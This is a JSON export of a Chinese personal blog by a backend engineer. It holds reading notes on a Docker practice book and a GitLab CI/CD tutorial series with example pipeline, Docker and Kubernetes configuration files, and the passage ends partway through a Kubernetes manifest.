{"meta":{"title":"Stdio's Blog","subtitle":"随便写写","description":null,"author":"David Dai","url":"https://blog.stdioa.com"},"pages":[{"title":"404!","date":"1969-12-31T16:00:00.000Z","updated":"2017-06-29T04:38:39.767Z","comments":false,"path":"404.html","permalink":"https://blog.stdioa.com/404.html","excerpt":"","text":"404 Not Found点击左侧头像返回首页"},{"title":"分类","date":"2018-07-11T13:26:13.094Z","updated":"2018-07-11T12:29:12.213Z","comments":false,"path":"categories/index.html","permalink":"https://blog.stdioa.com/categories/index.html","excerpt":"","text":""},{"title":"关于我","date":"2018-07-11T13:41:47.303Z","updated":"2018-07-11T13:41:47.303Z","comments":false,"path":"about/index.html","permalink":"https://blog.stdioa.com/about/index.html","excerpt":"","text":"简介昵称：小戴。很多姓戴的人都有这样一个昵称 😂南京航空航天大学 2013级 信息安全专业LCTT 成员，扇贝网后端工程师曾经是天天缺觉的“特困生”，然而现在天天早睡早起（算是吧）被同学称为“金陵丈量者”，希望有一天能够走遍南京人生苦短，我用 Python 业余爱好羽毛球、乒乓球、古典音乐、钢琴、咖啡。 涉猎领域 编程语言C / C++ / Python / Go(刚刚开始) / Node.js Web 开发前端: HTML / CSS / Javascript(ES6)组件库：React.js(会一点) / Vue.js (Vue.js + vuex + vue-router)样式库：Semantic UI后端:Web 框架：Flask / Django / Bottle / ExpressRPC 框架：gRPC / sea数据库: MySQL / MongoDB（了解） / Redis DevOpsKubernetes / GitLab CI/CD 编程工具代码编辑器: Sublime Text版本控制: Git（熟练）代码构建: gulp, babel, webpack 个人页面Github仓库Coding仓库博客（Github Pages分流）我的乐谱分享站 联系我E-mail: c3RkaW9hQDE2My5jb20=Telegram: @StdioA"},{"title":"Repositories","date":"2018-07-11T12:29:12.214Z","updated":"2018-07-11T12:29:12.214Z","comments":false,"path":"repository/index.html","permalink":"https://blog.stdioa.com/repository/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2018-07-11T13:28:36.761Z","updated":"2018-07-11T13:28:36.761Z","comments":true,"path":"links/index.html","permalink":"https://blog.stdioa.com/links/index.html","excerpt":"","text":"Resxkz"},{"title":"标签","date":"2018-07-11T12:29:12.215Z","updated":"2018-07-11T12:29:12.215Z","comments":false,"path":"tags/index.html","permalink":"https://blog.stdioa.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"《Docker 实践》阅读笔记","slug":"docker-practice-notes","date":"2018-10-30T13:14:00.000Z","updated":"2018-10-30T13:26:38.044Z","comments":true,"path":"2018/10/docker-practice-notes/","link":"","permalink":"https://blog.stdioa.com/2018/10/docker-practice-notes/","excerpt":"这几天看了《Docker 实践》，写了一点自己不知道或者想记录下来的内容，所以是一份笔记，但不是一份基础教程。","text":"这几天看了《Docker 实践》，写了一点自己不知道或者想记录下来的内容，所以是一份笔记，但不是一份基础教程。 1. 第一部分：Docker 基础 Docker 的优势通过将环境打包成镜像的方式来标准化系统环境，需要使用这个环境的人可以直接使用镜像，无须重头配置环境。所以，Docker 在很多情况下可以作为虚拟机的替代使用。对 Linux 用户而言，Docker 镜像没有依赖，所以非常适合用于打包软件。 关键概念：镜像和容器简而言之，容器运行着由镜像定义的系统，而镜像本质上是一个文件系统，由一个或多个层加上一些 Docker 的元数据组成。我们可以从一个镜像中生成多个容器，这些容器完全隔离，其行为不会相互影响。一个巧妙的类比：镜像和容器的关系，就相当于类和对象的关系。创建 Docker 镜像有四种标准的方式：Docker run &amp; docker commit: 手工创建镜像DockerfileDockerfile 及配置管理（configuration management）工具从头创建镜像并导入一组文件（FROM scratch &amp; ADD sth）Docker 容器修改文件时会使用写时复制（copy-on-write）的方式：容器的最顶层是一个可写层，当容器需要修改文件时，docker 会将该文件从下面的只读层复制到可写层，再在可写层对文件进行修改。在 docker commit 时，这个可写层将会冻结，变为一个具有自身标识符的只读层。 使用技巧以守护进程方式运行容器：-d 参数会让镜像在后台运行；--restart 参数指定了容器重启的条件：策略描述no容器退出时不重启always容器退出时每次都会重启on-failure[:max-retry]只在失败时（返回非 0 状态码）时重启如果想要移动 Docker 存储数据的位置，则在启动 docker daemon 时，使用 -g 参数并指定新位置；实现容器间通信：在 docker run 时使用 --link &lt;hostport&gt;:&lt;container&gt;:&lt;containerport&gt; 参数可以将另外一个容器的某个端口映射到当前容器的端口中以；实现原理是更改当前容器的 hosts 文件；前提条件：构建镜像时必须用 EXPOSE 命令暴露容器的端口。在线查找镜像：使用 docker search 功能。 2. 第二部分：Docker 与开发 用 Docker 代替虚拟机可以考虑使用 Docker 来代替虚拟机，但由于缺少 systemd 等工具，所以可以考虑用 supervisord 托管服务。Docker 和虚拟机的差异：Docker 面向应用，而虚拟机面向操作系统Docker 容器和其它容器共享操作系统，而每个虚拟机独享一个操作系统Docker 被设计成只运行一个主要进程，而不是管理多组进程 构建镜像 Dockerfile 的使用Dockerfile 的用途：从给定镜像开始，为 Docker 指定一系列的 shell 命令和元指令，从而产出最终所需的镜像ADD 和 COPY 命令的区别：ADD 会自动在镜像内解压归档文件（如 .tar 或 .tar.gz），但 COPY 只会单纯复制文件。按需使用。ADD 命令可以将一个 URL 对应的文件添加到容器，但通过 URL 下载的文件不会自动解压。在 RUN 命令中使用命令链，有助于减小镜像层数，缩小容器体积。而且将 apt-get update 和 apt-get install 命令连起来，可以保证每次构建时所装的软件都是最新的，而不会从之前缓存的索引中安装一个旧版本软件。如果希望手动清除某一层的缓存，可以在命令后面加一条注释，如 ADD a /a # bust the cacheENTRYPOINT 指定了镜像的入口点，用户在 docker run 时所写的命令都是入口点执行文件的参数。如果不想用镜像的入口点，则需要在 docker run 的时候添加 --entrypoint=xxxx 选项以重载入口点。ENTRYPOINT 和 CMD 的区别：ENTRYPOINT 指定了容器入口点，而 CMD 指定了入口点程序的默认参数。假设 Dockerfile 为：123FROM ...ENTRYPOINT ['/entrypoint.sh']CMD ['xxx', 'yyy']docker run &lt;image&gt; 时，会执行 /entrypoint.sh xxx yyy；docker run &lt;image&gt; a b 时，a b 会覆盖掉 CMD 的值，而不会覆盖入口点，所以会执行 /entrypoint.sh a bENTRYPOINT 和 CMD 命令的参数形式：这两个命令的参数有两种形式，一种为字符串类型 CMD /entrypoint.sh a b，一种为数组类型 CMD ['/entrypoint.sh', 'a', 'b']，其中字符串类型的参数在实际执行前会在前面加上 bash -c 命令变成 bash -c '/entrypoint.sh a b'，但数组类型的参数则不会改变，直接运行 /entrypoint.sh.两种方法有利有弊，按需使用。 对镜像的操作扁平化镜像如果想将镜像中的多层合为一层（如在某层中添加了密钥又在后面删除），则可以在运行容器之后，使用 docker export &lt;container&gt; | docker import some-image 来讲容器的目录结构导出为 tar 文件，然后再以此重新制作镜像。这样的镜像只会有一层。对容器进行逆向工程书里有个脚本，但是不能用；从 StackOverFlow 上找了一个可以用，但是都不如我在 Portainer 里看的全😂用这些方法可以逆向出一部分命令，比如 MAINTAINER EXPOSE RUN 等，但由于构建上下文的缺失，ADD 命令只能显示出添加文件的哈希值和容器内路径，并不能知道具体添加的文件是什么样子的。 减小镜像体积的方法上文提到的“扁平化镜像”方法可以有效地减少构建时镜像分层所带来的开销；除此之外，还有一些方法可以减小容器的体积：使用一个更小的基础镜像：ubuntu 有数十 MB，而 alpine 只有几 MB自己事后清理：可以在装完软件包以后用 apt clean 等命令删除缓存和软件包索引将一系列命令设置为一行，这样可以减少层数编写一个脚本来完成安装：原理同 3，只不过不需要在 Dockerfile 中写太多代码删除不必要的软件包和文档文件：进入容器中，删除所有用不到的文件（甚至基础的可执行文件），并将容器导出（至于这么拼嘛 🌚）特殊情况——系统只需要一个带静态链接的二进制文件（如 go 编译后的文件）：用 scratch 就可以了，绝对小进行静态编译，并将可执行文件放入另一个容器中：书中做出了 CMD [&quot;cat&quot;, &quot;/go/bin/go-web-server&quot;] docker run go-web-server &gt; go-web-server 这样的的操作用来跨镜像复制文件。但自从 17.05 版本引入多阶段构建（multi-stage build）后，这个繁琐的过程已经不需要了，构建程序和添加程序的操作可以在一个 Dockerfile 中完成，具体可以参见 Docker 文档。 运行容器 容器中的服务在 Docker 的世界里，公认的最佳实践是尽可能多地把系统拆分开，直到在每个容器上都只运行一个“服务”，并且所有容器都通过链接相互连通。如果想在容器中管理多个进程，可以考虑用 supervisord，或者使用 phusion/baseimage。参见这篇文章。 在 Docker 中使用外部数据卷除了在 docker run 时使用 -v 参数以外，我们还可以定义数据容器，然后在运行其它容器时使用 --volumes-from 标志。使用数据容器可以在多个容器共享数据卷时更方便管理数据卷。例：需要改变其中一个容器的挂在路径时，如果不使用数据容器，则需要在多个容器的启动脚本中修改 -v 参数的值，而使用数据容器后，只需要更改数据容器就可以了。使用数据容器中的卷并不需要让容器处在运行状态，所以可以在运行时使用 /bin/true 等命令，让数据容器创建后立即退出。注意：多个容器共享数据容器时，同时写入同一文件可能会导致数据卷中的数据被覆盖或截断。PS: 刚刚遇到了一个宿主机文件更改但未同步至容器的问题，可以参考这个帖子最后面的解释。 删除数据卷为了保证数据安全，Docker 在删除容器时不会自动删除容器锁关联的数据卷，用户可以选择手动将这些数据卷清除如果希望删除容器时自动删除数据卷，可以在 docker rm 中加入 -v 标志。 解绑（detach）容器如果想要从一个容器的交互会话中退出，可以按 Ctrl+P Ctrl+Q，Docker 检测到这个按键序列后，就会自动解绑容器，但同时容器依旧会在后台运行。如果想重新回到容器中，可以用 docker attach 命令。这个操作和 docker run -d 然后 docker exec 有点相似，但上面的方法操纵的是镜像内 PID 为 1 的“主进程”，而 exec 命令会新启动一个新的进程给当前 tty 使用。 在运行的容器里执行一些命令如果容器主进程不是 shell 程序而是一些别的，可以用 docker exec 命令进入容器，这样 Docker 会在容器中新开一个进程给用户来使用。docker exec 有三种“模式”：基本的运行模式，同步运行命令，成功后退出，如 docker exec ps；守护进程模式，立即退出，命令在后台执行，如 docker exec -d nginx -g daemon off；交互模式，就是 -it 的样子啦，允许与进程进行交互，如 docker exec -it bash 使用技巧如果想让镜像立刻完成任务退出，可以使用 /bin/true 作为镜像启动命令，也可以用 touch /somefile，我更喜欢用第一个；如果想让镜像启动后立即挂起，可以使用 sleep infinity，或 tail -f /etc/hosts 等作为启动命令； 3. 第三部分：Docker 与 DevOps第三部分主要涉及到将 Docker 应用至 DevOps 流水线中，并在本地利用 Docker 模拟一些生产环境的网络条件（如高延迟、丢包等）来对服务的健壮性进行测试。由于还没有对这一部分进行实践，所以这部分的内容只会进行一些摘抄和总结。又是基本概念：持续集成：持续集成是指用于加快流水线的一个软件生命周期策略。在每次代码库发生重大修改时，通过自动重新运行测试，可以获得更快且稳定的交付，因为被交付的软件具有一个基础层次的稳定性。Docker 的可移植性和轻量性，使其成为 CI 从节点（一台供 CI 主服务器连接以便执行构建的机器）的理想选择。与虚拟机从节点相比，Docker CI 从节点向前迈了一大步（相对构建裸机更是一个飞跃）。它可以使用一台宿主机在多种环境上进行构建、快速销毁并创建整洁的环境来确保不受污染的构建，来使用所有熟悉的 Docker 工具来管理构建环境。 CI 技巧如果是开源项目，可以考虑用 Docker Hub 工作流完成自动构建；如果是本地构建，可以为包管理器安装一个 Squid 代理，通过缓存软件包来加快软件下载速度，同时节省流量。 CI/CD 流水线CD 背后的关键思想之一是构建提升。构建提升是指流水线的每个场景（用户验收测试、集成测试以及性能测试）只有在前一个场景成功时才能触发下一个场景。 “Docker 契约”在 CD 全过程中，从 CI 产出的镜像必须是最终的、不可修改的。这样，在不同团队、不同环境中运行的代码和依赖才可以被彻底固化，有利于问题的复现及排查。 微服务架构etcd 可作为环境的中央配置存储，服务发现可以用 etcd、confd 及 nginx 的组合来实现。 网络模拟：无痛的现实环境测试 Docker Compose: 管理容器间链接之前写到可以用链接的方式链接容器从而实现容器间通信，但链接的配置比较繁琐，而且出现问题难以恢复（需要依序重启所有容器才能重置所有链接）。所以，如果需要启动一组互相连接的容器，可以使用 Docker Compose.Docker Compose 的 YAML 配置可以使容器的管理变得十分简单，它把编排容器的复杂事务从手工且易出错的过程变成了可通过源代码控制的更安全和自动化的过程。12345678echo-server: image: server expose: - \"2000\"client: build: . # 使用 ./Dockerfile 来构建镜像 links: - echo-server:talkto # 这里的参数与 --link 的参数一致docker-compose up 后，client 容器就可以通过 talkto 的 host 与 echo-server 通信。但是，这里的 host 解析是静态的，如果希望在容器内使用可动态配置的 DNS，可以引入 resolvable. 网络测试想要为单个容器应用不同的网络状况，可以用 Comcast想要对大量容器进行网络状况编排设置，可以用 Blockade想要跨宿主机进行容器间无缝通信，可以使用 Weave 构建基底网络docker network 提供试验性的网络构建功能啊…随着容器编排和 Service Mesh 框架的出现，貌似这些问题都可以更轻松地解决了 _(:з」∠)_","categories":[{"name":"DevOps","slug":"DevOps","permalink":"https://blog.stdioa.com/categories/DevOps/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://blog.stdioa.com/tags/Docker/"},{"name":"读书","slug":"读书","permalink":"https://blog.stdioa.com/tags/读书/"}]},{"title":"GitLab CI/CD: 辅助工具","slug":"gitlab-cicd-auxiliary","date":"2018-07-15T12:21:00.000Z","updated":"2018-10-30T13:55:58.813Z","comments":true,"path":"2018/07/gitlab-cicd-auxiliary/","link":"","permalink":"https://blog.stdioa.com/2018/07/gitlab-cicd-auxiliary/","excerpt":"本文会讲一些在 GitLab CI/CD 中可能会用到的辅助工具，包括隐藏任务、依赖缓存、定时任务以及部署环境。","text":"本文会讲一些在 GitLab CI/CD 中可能会用到的辅助工具，包括隐藏任务、依赖缓存、定时任务以及部署环境。 0. TL;DRHidden keys (jobs)Cache dependencies in GitLab CI/CDPipeline SchedulesIntroduction to environments and deployments 1. 隐藏任务先讲个简单的。有的时候我们需要在 Pipeline 中跳过某些任务，通常情况下我们可以用任务定义中的 when 和 except 属性来控制任务是否显示。但是如果我们想暂时删掉这个任务怎么办？一种方法，是在 .gitlab-ci.yml 中删掉或注释掉这个任务；另一种做法是，直接在任务定义的 key 中加个点号(.)，就可以把这个任务隐藏起来。这种做法和 Linux 中隐藏文件的方法非常相似，也是 GitLab 官方推荐的做法。 2. 依赖缓存之前我们的项目依赖是直接打在 Docker 镜像里的，但是后来技术更新后，单元测试使用的镜像变成了构建用的 pymicro，内部不包含任何依赖，需要在运行测试之前从头开始安装，为此会耗费大量时间。于是，我就想把这些依赖文件缓存起来。于是找到了这个文档，在测试任务运行时，使用 virtualenv 将所有依赖放进项目目录下，并配置缓存，这样在任务运行成功后，CI 系统会将依赖缓存起来，保存在 Runner 中，下次运行时就不需要重新安装依赖了。经实测，加上依赖缓存可以使我们的测试任务运行时间从两分半缩短到一分半。于是很开心地省下了无数个 1s 一分钟。配置文件如下：123456789101112131415161718test_all: image: \"/pymicro\" stage: test_all variables: GIT_STRATEGY: fetch PIP_CACHE_DIR: \"$CI_PROJECT_DIR/.cache\" before_script: - \"[ -e venv ] || ( pip install virtualenv -i https://mirrors.aliyun.com/pypi/simple &amp;&amp; virtualenv venv )\" - source venv/bin/activate - pip install -U -r test_requirements.txt -i https://mirrors.aliyun.com/pypi/simple script: - flake8 app - pytest tests cache: paths: - .cache/ - venv/ key: requirement-cache需要注意的是，cache 只能缓存项目目录下的文件，不能缓存其它目录的文件，比如 /opt/ 什么的。所以，我们必须用 virtualenv 或者 pipenv 将所有 site-packages 存在项目目录下。再就 before_script 里面的第一句和第三句多说两句：一开始是照着文档来写的，但是那样的话每次都要重新安装 virtualenv，并且还要重复创建虚拟环境。这也是安装依赖啊…并且就算是用 PIP_CACHE_DIR 把依赖包缓存在本地，创建 virtualenv 是也要安装 setuppools 和 pip 等，依然很慢 🌚 于是干脆加了个判断，如果有 venv 这个目录，就直接跳过创建虚拟环境的阶段。我们的 requirements.txt 是不锁依赖版本的，所以 pip install -U -r 可以在每次运行时对本地缓存的依赖进行更新，这样虽然缓存了依赖文件，但 pip 依然会和 registry 进行网络交互。去掉 -U 的话，依赖就不会被更新，但是 pip install 的执行时间会直接降低到一两秒钟。 3. 定时任务更准确的叫法，应该叫定时流水线(Scheduling Pipelines)。在项目的 CI/CD → Pipeline 菜单中，我们可以配置定时任务。定时的配置方式与 Crontab 的配置方式相同，还可以选择这个定时 pipeline 所使用的时区。配置好后就可以看到设置的定时任务，到时间就会在某个分支上自动触发。到现在为止，我们平时的 Pipeline 和定时任务中执行的任务是一模一样的。但如果我们有一些特殊的任务需要只在定时任务中执行，可以在 job 的 when 属性中写入 - schedules；同样，如果某些任务不应该在定时任务中执行，配置一下 except 属性就可以了。 4. 部署环境如果项目的 CD 流程在 GitLab 中进行的话，可以考虑在 .gitlab-ci.yml 中配置部署任务执行所在的环境：12345678910111213deploy_rpc: stage: deploy_production only: - master except: - schedules tags: - deploy-production when: manual environment: name: production/rpc script: - kubectl set image deploy/project-rpc \"app=$&#123;IMAGE_TAG&#125;\"配置完成后，在执行这个任务时，GitLab 就会从配置中读取环境配置，并记录当前环境部署时项目所在的 Git commit. 随后，我们就可以在 CI/CD → Environments 菜单中看到这个环境的部署情况。点击环境右边的执行（▶️）按钮，可以方便地将这个 commit 的代码部署到其它环境中；点击环境名，可以看到这个环境的部署历史，我们可以在这里方便地将环境中的代码回滚到之前的版本。GitLab 还提供了一个贴心的功能：我们可以直接在 Merge Request 的页面中看到当前 MR 的部署进度，以及该 MR 部署至每个环境的时间点。","categories":[{"name":"DevOps","slug":"DevOps","permalink":"https://blog.stdioa.com/categories/DevOps/"}],"tags":[{"name":"DevOps","slug":"DevOps","permalink":"https://blog.stdioa.com/tags/DevOps/"},{"name":"GitLab","slug":"GitLab","permalink":"https://blog.stdioa.com/tags/GitLab/"},{"name":"CI/CD","slug":"CI-CD","permalink":"https://blog.stdioa.com/tags/CI-CD/"}]},{"title":"GitLab CI/CD 基础教程（三）","slug":"gitlab-cicd-usage","date":"2018-06-23T12:53:00.000Z","updated":"2018-07-12T11:35:13.424Z","comments":true,"path":"2018/06/gitlab-cicd-usage/","link":"","permalink":"https://blog.stdioa.com/2018/06/gitlab-cicd-usage/","excerpt":"前两篇我们讲了 GitLab CI/CD 的简单应用及部署方式，这一篇简单讲一下如何将 GitLab CI/CD 与日常开发部署流程结合。","text":"前两篇我们讲了 GitLab CI/CD 的简单应用及部署方式，这一篇简单讲一下如何将 GitLab CI/CD 与日常开发部署流程结合。 0. TL;DR看文档？其实就是简单应用吧。.gitlab-ci.yml 的完整配置定义可以见第一篇博文。 1. 测试阶段测试阶段没什么好说的，只需要把 runner tag 打好（注册时使用 --tag-list 参数），基于 docker/k8s 把 Runner 搭起来，基本上就可以自动运行了。.gitlab-ci.yml 配置如下：123456789101112131415test_all: image: \"pymicro\" stage: test services: - name: mysql:5.6 alias: mysql command: [\"mysqld\", \"--character-set-server=utf8mb4\", \"--collation-server=utf8mb4_unicode_ci\"] veriables: MYSQL_DATABASE: db MYSQL_ROOT_PASSWORD: password before_script: - pip install -U -r requirements.txt script: - flake8 app - pytest tests这里定义的两个环境变量都是给 MySQL 服务用的，mysql 镜像会在容器启动时读取某些环境变量，来配置数据库。具体支持的环境变量可以参考 MySQL 的 docker image 页面。我们可以在 service 中自定义启动命令，这里我将 MySQL 的默认字符集设置成了 utf8mb4，否则服务器中的数据库字符集会是 latin1.需要注意的一点是，基于 Docker 部署的 Runner，可以使用服务别名, 也就是在跑测试的阶段中，可以通过 service alias 访问到对应的服务；而基于 Kubernetes 的 Runner 不支持，所以只能通过 127.0.0.1 访问。 2. 构建阶段构建阶段中，我们会用 Docker 将工程打包成镜像，并推送到远端 registry. 2.1 基本配置.gitlab-ci.yml 配置如下：123456789101112131415161718build_image: image: \"docker:17.11\" stage: build services: - name: \"docker:17.12.0-ce-dind\" alias: dockerd variables: DOCKER_HOST: tcp://127.0.0.1:2375 IMAGE: docker.registry/name/$&#123;CI_PROJECT_NAMESPACE&#125;-$&#123;CI_PROJECT_NAME&#125; before_script: - IMAGE_TAG=$&#123;IMAGE&#125;:$&#123;CI_COMMIT_SHA:0:8&#125; only: - master tags: - build script: - docker build -t $&#123;IMAGE_TAG&#125; -f Dockerfile . - docker push $&#123;IMAGE_TAG&#125;在这个任务中，我们启用了一个 dind 作为 service，并使用 DOCKER_HOST 环境变量来让 docker 命令与我们的 dind 服务通信。任务执行时，会根据项目中的 Dockerfile 构建并推送镜像。我们的镜像名称使用了项目组名 + 项目名的配置，tag 使用 commit SHA 前八位来构成。因为在 variable 字段中定义环境变量时，不能使用 ${CI_COMMIT_SHA:0:8} 这种 shell 字符串操作，所以只好在 before_script 中来定义这个环境变量。这里，我们需要在 docker 环境中启动一个 dind，来作为构建时所用的服务器。值得注意的一点是，如果你需要使用 dind，则 dind 所在的 container 应该具有特权（官方文档也有讲到）。所以在 Runner 注册时，需要加上 --docker-privileged 或 --kubernetes-privileged 参数（具体视执行平台而定），来使 job 运行时所在的 container 拥有特权。不过，在部署 runner 时，Runner daemon 所需的 container 并不需要这个特权（其实可以机器上的 docker service 或者操控 pod 已经是一种特权了😂）。 2.2 dind 服务调（luan）优（gao） 2.2.1 dind 成为独立服务上面定义的 job 中，dind 是一个 job service，也就是说，每次构建的时候都会从头开始构建。而 docker 构建提供了一套比较完善的缓存功能，如果 Dockerfile 某几层的构建命令完全一样（比如只是 RUN apt-get install xxx）的话，Docker 会在再次构建时自动使用之前已经构建好的层，这样可以减少构建时间。所以我在做完上面的那个流程之后立刻意识到了这一点，于是单独把 dind 从 CI 任务中抽离了出来，在 k8s namespace 中单独搭建了一个 dind 服务，并定义了 k8s service，而 job 中的 DOCKER_HOST 环境变量也改成了 tcp://dockerd:2375，因为 dind 并不在 job pod 里了，而是一个 k8s service，需要通过 DNS 来获取到具体的 IP.这样一来，在 job 结束后，dind 依然存在，并会保留前一次的构建层，这样下次构建的时候就可以跳过依赖安装步骤，大大缩短了构建所需的时间。在 k8s 中搭建 dind 服务的内容不在本博文讲述范围内，想搭建的话，可以去 Google 一下。 2.2.2 尼玛… Node 存储空间满了？在我们的 dind 服务运行起来一段时间后，就遇到了一个尴尬的问题：dind 服务占用了太多存储空间，导致 pod 的所在 node 出现了问题…这个问题有两种解决方案：一是单独做一个 node，并用 node selector 将 dind 单独放在那个 node 上，以避免影响其它服务；二是为 dind 单独挂一个 volume，使用 PersistentVolume 进行持久化存储。而我司的解决方案简直是骚断腿：单独买一台 VPS，在上面搭一个 docker 服务器，然后把这个服务引入 k8s 集群中 😂所以，在搭建好服务器之后，修改 k8s 中的 Service，为 Service 添加 Endpoint，注意端点名称要与服务名称一致：123456789101112131415161718192021222324252627kind: Servicemetadata: name: dockerd namespace: cicd labels: app: dockerdspec: ports: - protocol: TCP port: 2375 targetPort: 2375 clusterIP: None---kind: EndpointsapiVersion: v1metadata: name: dockerd namespace: cicd labels: app: dockerdsubsets: - addresses: - ip: 192.168.8.45 ports: - port: 2375这样我们在集群中查看 dockerd 的 IP 地址时，就会得到那台 VPS 的 IP 了。然后…记得写个 cron job，定期清理 docker 服务器上的缓存，否则硬盘也是会满的_(:з」∠)_。 3. 部署阶段部署阶段中，我们会使用 kubectl set image 命令，对特定 Deployment 触发一次滚动更新。.gitlab-ci.yml 配置：12345678910111213141516deploy_production: image: \"kubectl:1.8.1\" stage: deploy variables: GIT_STRATEGY: none variables: IMAGE: docker.registry/name/$&#123;CI_PROJECT_NAMESPACE&#125;-$&#123;CI_PROJECT_NAME&#125; before_script: - IMAGE_TAG=$&#123;IMAGE&#125;:$&#123;CI_COMMIT_SHA:0:8&#125; only: - master when: manual tags: - deploy-production script: - kubectl set image deploy/myproject \"app=$&#123;IMAGE_TAG&#125;\" --record这里我们定义了一个 GIT_STRATEGY 环境变量，有了这个变量，在 CD 任务执行时，Runner 会跳过克隆代码的步骤，因为在这个阶段中我们并不需要项目代码。而 when: manual 属性表示这个任务需要手动触发。这个阶段中，我们需要一个 ServiceAccount 来让 pod 使用 kubectl 与集群通信；同时为了保证 set image 命令的成功执行，我们还需要为这个账户赋予一些权限。12345678910111213141516171819202122232425262728293031apiVersion: v1kind: ServiceAccountmetadata: name: deployer namespace: cicdimagePullSecrets:- name: dockersecret---apiVersion: rbac.authorization.k8s.io/v1kind: ClusterRolemetadata: name: deployerrules: - apiGroups: [\"extensions\"] resources: [\"deployments\"] verbs: [\"get\", \"patch\"]---apiVersion: rbac.authorization.k8s.io/v1kind: ClusterRoleBindingmetadata: name: cicd-deployersubjects:- kind: ServiceAccount name: deployer namespace: cicdroleRef: kind: ClusterRole name: deployer apiGroup: rbac.authorization.k8s.io同时，在我们注册这个 runner 时，需要加上 --kubernetes-service-account deployer 参数，这样在 job pod 启动时，集群将 deployer 账户的凭据注入进 pod，kubectl 命令才能正常使用。至此，我们（应该）可以实现并部署一套完整的测试→构建→部署流程。这个系列到此也就结束了，后面还会有一篇，讲点周边的小工（玩）具。","categories":[{"name":"DevOps","slug":"DevOps","permalink":"https://blog.stdioa.com/categories/DevOps/"}],"tags":[{"name":"DevOps","slug":"DevOps","permalink":"https://blog.stdioa.com/tags/DevOps/"},{"name":"GitLab","slug":"GitLab","permalink":"https://blog.stdioa.com/tags/GitLab/"},{"name":"CI/CD","slug":"CI-CD","permalink":"https://blog.stdioa.com/tags/CI-CD/"}]},{"title":"GitLab CI/CD 基础教程（二）","slug":"gitlab-cicd-deploy","date":"2018-06-18T07:46:00.000Z","updated":"2018-10-08T13:06:22.539Z","comments":true,"path":"2018/06/gitlab-cicd-deploy/","link":"","permalink":"https://blog.stdioa.com/2018/06/gitlab-cicd-deploy/","excerpt":"本文是 GitLab CI/CD 系列的第二篇，主要介绍 GitLab CI Runner 在 Docker 和 Kubernetes 环境下的部署方式。","text":"本文是 GitLab CI/CD 系列的第二篇，主要介绍 GitLab CI Runner 在 Docker 和 Kubernetes 环境下的部署方式。 0. TL;DR文档在这儿。Changelog:2018-10-08 21:05 补上缺失的 k8s Secret 定义文件。 1. GitLab Runner 的运行环境及执行环境选择GitLab Runner 用 Go 语言写成，最后打包成单文件进行分发，所以可以在很多平台下快速运行，包括 Windows / GNU Linux / MacOS 等，同时也提供 Docker 镜像，方便在 Docker / Kubernetes 环境中部署。但除了 Runner 运行外，Runner 还需要一个环境来运行 jobs. 这个环境称之为执行环境（executor）。GitLab Runner 支持多种执行环境，包括 SSH，Docker，VirtualBox 等。不同执行环境对 GitLab CI/CD 不同功能的支持情况，可以看官方文档中的兼容性表格。由于我司主要用 Docker 或 Kubernetes 来托管服务，并且在进行测试时需要 service 的支持，所以自然只剩下了两种选择，Docker 和 Kubernetes. 在下文中会讲解 GitLab 在 Docker 和 Kubernetes 中的部署方式。尽管运行环境和执行环境可以相互独立，但为了方便起见，我更推荐在同一个环境中运行 runner daemon 和 jobs. 2. GitLab Runner 部署简单来讲，GitLab Runner 的部署方式分为两步：运行、注册。 2.1 注册 runner在一个 runner daemon 进程中，我们可以同时注册并运行多个 runner，来并行完成多个场景下的不同任务。注册的步骤在不同平台下大同小异：运行 gitlab-runner register 命令，会输出一个交互界面，在里面依次输入 GitLab 实例地址、CI Token、Runner 描述、标签列表（用于区分不同类型的 Runner，使不同阶段的 job 在不同的 Runner 中运行）、执行环境类型，如果选择基于 Docker 的执行环境，则需要再输入一个缺省的 job image.注册之后，Runner 会将配置写入 /etc/gitlab-runner/config.toml 文件中，如果文件内容不丢失，gitlab-runner 程序会自动读取配置内容并运行，无需重复注册。当然，如果你需要一些更高级的配置，则可以直接修改 config.toml. 具体的配置可以见官方文档。在配置文件更改后，runner daemon 会自动重新加载配置，无需重启。此外，gitlab-runner register 非常鬼畜的一点在于，config.toml 中的部分配置可以通过环境变量注入，且所有配置都可以通过注册命令的参数传入。也就是说，如果你希望不接触 config.toml，只使用一条命令来配置并注册单个 runner，gitlab-runner register 命令完全可以满足你的要求。🌚 2.2 在 Docker 环境中部署一句话：12345docker run -d --name gitlab-runner --restart always \\ -v /var/run/docker.sock:/var/run/docker.sock \\ -v /data/gitlab-runner/conf:/etc/gitlab-runner \\ --net=host \\ gitlab/gitlab-runner:latest注意：我们在这里将 /var/run/docker.sock 挂载进了 gitlab-runner 容器，这也就意味着我们将 Docker 环境的控制权交给了 runner daemon，这样 runner daemon 可以在收到任务指令时，使用当前 Docker 环境作为执行环境，在里面运行容器以执行任务。当然，这样挂载是一种相当危险的做法。如果你比较担心安全问题，可以考虑做一个 docker compose，并在里面运行一个 dind （Docker in Docker）来作为 Runner 的执行环境。 2.3 在 Kubernetes 环境中部署在 k8s 环境中的部署要稍微复杂一些（因为配置文件太长😂），大体需要配置以下五部分：一个或者两个 Namespace（取决于你是否要把 job pod 和 daemon 放在同一个 namespace 里）一个 ConfigMap，用于注入 runner 配置一个 Deployment，用于运行 runner daemon一个 ServiceAccount，用于给 daemon 使用，来启动 pod，为运行任务提供环境（当然，用 default）也不是不可以一个 Role + RoleBinding，为上面的 ServiceAccount 赋予 pods 和 pods/exec 权限runner 的配置注入有两种方式：先在 GitLab 中注册好 runner，然后在 ConfigMap 中写好配置文件，并在 Deployment 中作为一个 Volume 挂载到配置目录下。这是官方文档中推荐的做法；在 ConfigMap 中定义环境变量，并在 pod template 的 envFrom 属性中定义一个 configMapRef 来注入环境变量，并在 pod 启动时当场注册一个 runner；在 pod 被停止前再调用命令将这个 runner 注销掉（推荐，否则 GitLab 后台会看到很多离线的 runner）。由于编辑器的高亮规则通常不会处理一个文件里出现两种不同语言的情况，在 ConfigMap 里写 toml 会很挣扎，所以我使用的是第二种注入方式。完整的配置文件：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150apiVersion: v1kind: Namespacemetadata: name: cicd---apiVersion: v1kind: ServiceAccountmetadata: name: executor namespace: cicdimagePullSecrets:- name: dockersecret---apiVersion: rbac.authorization.k8s.io/v1kind: Rolemetadata: namespace: 